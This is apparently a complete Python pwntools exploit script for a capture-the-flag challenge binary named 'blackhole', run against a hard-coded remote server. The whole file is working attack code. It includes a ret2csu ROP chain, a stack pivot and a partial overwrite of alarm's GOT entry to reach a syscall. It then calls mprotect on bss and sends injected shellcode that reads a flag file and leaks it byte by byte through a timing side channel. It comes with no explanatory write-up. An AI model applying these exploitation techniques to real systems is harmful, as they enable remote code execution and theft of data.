from pwn import *
from hashlib import sha256
import sys, time
import string, random

context.binary = "./blackhole"

def pow_solver(chal):
    gg = "".join(chr(i) for i in xrange(256))
    while True:
        sol = "".join(random.choice(gg) for _ in xrange(4))
        if sha256(chal + sol).digest().startswith('\0\0\0'):
            p.send(sol)
            break

def gen_sc(byte, i):
    sc = asm(shellcraft.open("./flag"))
    sc += asm('''
        xor r14, r14
        xor r15, r15
        mov r15, 0x601200
        ''')
    sc += asm(shellcraft.read("rax", "r15", 200))
    sc += asm('''
        xor rsi, rsi
        xor rdi, rdi
        mov sil, byte ptr [r15+'''+str(i)+''']
        mov dil, ''' + hex(ord(byte)) + '''
        cmp sil, dil
        je correct
        jmp wrong
        correct:
        jmp correct
        wrong:
        mov rax, 1
        mov rdi, 1
        mov rsi, 0x601068
        mov rdx, 100
        syscall
        ''')
    return sc

def exploit(byte, i):    
    binary = ELF("./blackhole")
    alarm_to_syscall = "\x05"
#    alarm_to_syscall = "\x85"
    bss = 0x601200
    pop1rdi = 0x400a53        # : pop rdi; ret;
    pop2rsi = 0x400a51        # : pop rsi; pop r15; ret;
    main_ret = 0x4009e0
    leaveret = 0x4009c6
    vuln = 0x4009a7
    magic = 0x4009e0        # : mov eax, 0; pop rbp; ret;
    csu_attack = 0x400a30
    pop6ret = 0x400a4a        # : pop rbx; pop rbp; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

# stage 1
# set payload in bss

    exp = "A" * 0x20 + p64(bss - 8)
    exp += p64(pop6ret) + p64(0) + p64(1) + p64(binary.got["read"])
    exp += p64(0x400) + p64(bss) + p64(0)
    exp += p64(csu_attack)
    exp += p64(0xdeadbeef) * 7
    exp += p64(vuln)
    p.sendline(exp)
    payload = exp

# make payload

    exp = p64(pop6ret) + p64(0) + p64(1) + p64(binary.got["read"])
    exp += p64(1) + p64(binary.got["alarm"]) + p64(0)
    exp += p64(csu_attack)
    exp += p64(0xdeadbeef) * 7

# set syscall -> rax

    exp += p64(pop6ret) + p64(0) + p64(1) + p64(binary.got["read"])
    exp += p64(10) + p64(bss - 0x100) + p64(0)
    exp += p64(csu_attack)
    exp += p64(0xdeadbeef) * 7

# call mprotect

    exp += p64(pop6ret) + p64(0) + p64(1) + p64(binary.got["alarm"])
    exp += p64(7) + p64(0x1000) + p64(bss & 0xfffff000)
    exp += p64(csu_attack)
    exp += p64(0xdeadbeef) * 7

# read shellcode

    exp += p64(pop6ret) + p64(0) + p64(1) + p64(binary.got["read"])
    exp += p64(0x200) + p64(bss + 0x700) + p64(0)
    exp += p64(csu_attack)
    exp += p64(0xdeadbeef) * 7
    exp += p64(bss + 0x700)
    payload += exp

    p.sendline(exp)

    exp = "A" * 0x20 + p64(bss - 8) + p64(leaveret)
    time.sleep(0.1)
    p.sendline(exp)
    payload += exp

    time.sleep(0.1)
    payload += alarm_to_syscall
    p.send(alarm_to_syscall)
    time.sleep(0.1)
    payload += "q" * 10
    p.send("q" * 10)

# send shellcode
    sc = gen_sc(byte, i)
    p.sendline(sc)

if __name__ == "__main__":
    flag = ''
    cset = "{}_" + string.letters + string.digits
    for i in xrange(200):
        for byte in cset:
            p = remote("202.120.7.203", "666")
            chal = p.recvuntil("\n")[:-1]
            pow_solver(chal)

#            p = process(["./blackhole"])
            exploit(byte, i)
            now = time.time()

            try:
                p.recv(timeout=2)

            except EOFError:
                pass

            after = time.time()
            dt = after - now
            if dt > 2:
                flag += byte
                log.info("found : " + flag)
                p.close()
                break

            p.close()
            continue


